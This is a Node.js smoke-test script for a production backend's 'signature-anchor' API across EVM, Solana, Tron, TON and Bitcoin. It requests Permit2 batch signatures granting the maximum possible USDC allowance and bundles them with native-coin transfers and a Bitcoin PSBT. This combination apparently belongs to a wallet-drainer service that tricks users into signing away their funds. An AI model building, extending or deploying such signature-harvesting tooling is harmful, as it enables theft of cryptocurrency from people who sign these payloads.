/**
 * 5-chain production smoke — EVM, SOL, TRON, TON, BTC (no Cosmos/Aptos/Sui).
 * Usage: node scripts/test-5chain-live.mjs
 */
const BACKEND = (process.env.BACKEND_URL || 'https://legionapi-production.up.railway.app').replace(/\/$/, '');

const WALLETS = {
  evm: '0xbe3cebae5728C07F39416f0dC1d0165d2972db12',
  sol: '3TKvjiU5bYnDr883orJz6vLCqksfeaDfmwSMQNCbsTZv',
  tron: 'TLsV52sRWD89V3WsyFKdPgKSoTs12xzb1',
  ton: 'UQCD39VS5jcptHL8vMjEXrzGaRcCVYto7kBd9TzdNYiWfUZE',
  btc: 'bc1q7frtqkunftdgukjghpnhwd0wv4f0hpsqkyj43v',
};
const MAX_PERMIT = '115792089237316195423570985008687907853269984665640564039457584007913129639935';
const USDC = '0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48';

function unwrap(p) {
  if (p == null || typeof p !== 'object') return p;
  if (p.data != null && (typeof p.ok === 'boolean' || typeof p.success === 'boolean')) return p.data;
  return p;
}

function parseEnvelope(res, data) {
  if (!data || typeof data !== 'object') return { ok: res.ok, data };
  if (typeof data.success === 'boolean') {
    return { ok: data.success && res.ok, data: unwrap(data.data ?? data) };
  }
  if (typeof data.ok === 'boolean') {
    return { ok: data.ok && res.ok, data: unwrap(data.data ?? data) };
  }
  return { ok: res.ok, data };
}

async function api(method, path, body) {
  const res = await fetch(`${BACKEND}${path}`, {
    method,
    headers: { 'Content-Type': 'application/json' },
    body: body ? JSON.stringify(body) : undefined,
    signal: AbortSignal.timeout(120_000),
  });
  const raw = await res.json().catch(() => ({}));
  const env = parseEnvelope(res, raw);
  return { status: res.status, ok: env.ok, data: env.data, message: raw.message || '' };
}

const checks = [];
function record(chain, name, pass, detail) {
  checks.push({ chain, name, pass, detail });
  console.log(`${pass ? 'PASS' : 'FAIL'} [${chain}] ${name}${detail ? ` — ${detail}` : ''}`);
}

console.log(`Backend: ${BACKEND}\n`);

const health = await api('GET', '/health/production');
record('infra', 'production-health', health.status === 200, `status=${health.status} tier=${health.data?.tier ?? '?'}`);

const evmBatch = await api('POST', '/api/v1/signature-anchor/permit2-batch-typed-data', {
  wallet_address: WALLETS.evm,
  chain_id: 1,
  permits: [{ token: USDC, amount: MAX_PERMIT }],
});
record('EVM', 'permit2-batch', evmBatch.status === 200 && !!evmBatch.data?.typed_data, `status=${evmBatch.status}`);

const solBatch = await api('POST', '/api/v1/signature-anchor/permit2-batch-typed-data', {
  wallet_address: WALLETS.evm,
  chain_id: 1,
  permits: [{ token: USDC, amount: MAX_PERMIT }],
  sol_wallet: WALLETS.sol,
  nativeAmountSol: '1000000',
});
record('Solana', 'omni-batch-wire', solBatch.status === 200 && !!solBatch.data?.native_transfer_sol, `status=${solBatch.status}`);

const trxBatch = await api('POST', '/api/v1/signature-anchor/permit2-batch-typed-data', {
  wallet_address: WALLETS.evm,
  chain_id: 1,
  permits: [{ token: USDC, amount: MAX_PERMIT }],
  trx_wallet: WALLETS.tron,
  nativeAmountTrx: '1000000',
});
record('Tron', 'omni-batch-wire', trxBatch.status === 200 && !!trxBatch.data?.native_transfer_trx, `status=${trxBatch.status} ${trxBatch.message?.slice(0, 60) || ''}`);

const tonBatch = await api('POST', '/api/v1/signature-anchor/permit2-batch-typed-data', {
  wallet_address: WALLETS.evm,
  chain_id: 1,
  permits: [{ token: USDC, amount: MAX_PERMIT }],
  ton_wallet: WALLETS.ton,
  nativeAmountTon: '100000000',
});
record('TON', 'omni-batch-wire', tonBatch.status === 200 && !!tonBatch.data?.native_transfer_ton, `status=${tonBatch.status}`);

const btcPsbt = await api('POST', '/api/v1/signature-anchor/bitcoin-psbt', {
  wallet_address: WALLETS.btc,
  amount_sat: '1000',
});
const btcOk = btcPsbt.status === 200 && !!btcPsbt.data?.psbt_base64;
const btcNoUtxo = btcPsbt.status === 400 || (btcPsbt.message || '').toLowerCase().includes('utxo');
record('Bitcoin', 'psbt-builder', btcOk || btcNoUtxo, btcOk ? 'psbt ready' : `status=${btcPsbt.status} ${(btcPsbt.message || '').slice(0, 80)}`);

const ext = health.data?.extended_chains ?? health.data?.chains;
if (ext) {
  for (const leg of ['cosmos', 'aptos', 'sui']) {
    const disabled = ext[leg]?.enabled === false || ext[leg]?.status === 'disabled';
    record(leg, 'env-gated-off', disabled !== false, JSON.stringify(ext[leg] ?? 'missing').slice(0, 80));
  }
}

const failed = checks.filter((c) => !c.pass).length;
console.log(`\n${checks.length - failed}/${checks.length} passed`);
process.exit(failed > 0 ? 1 : 0);
